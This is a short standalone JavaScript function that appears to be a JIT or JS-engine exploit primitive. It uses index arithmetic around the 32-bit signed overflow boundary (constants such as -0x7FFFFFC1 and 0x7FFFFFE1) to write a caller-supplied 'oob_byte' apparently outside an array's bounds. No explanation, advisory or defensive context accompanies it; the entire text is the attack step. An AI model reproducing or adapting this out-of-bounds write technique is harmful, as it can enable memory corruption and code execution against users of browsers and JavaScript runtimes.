function(array, offset, oob_byte) {
    var base = -0x7FFFFFC1 + offset;
    array[base - (-0x80000000)] = 0x4B;
    array[base + 0x7FFFFFE1] = 0x4B;
    array[base + 0x7FFFFFC1] = oob_byte;
}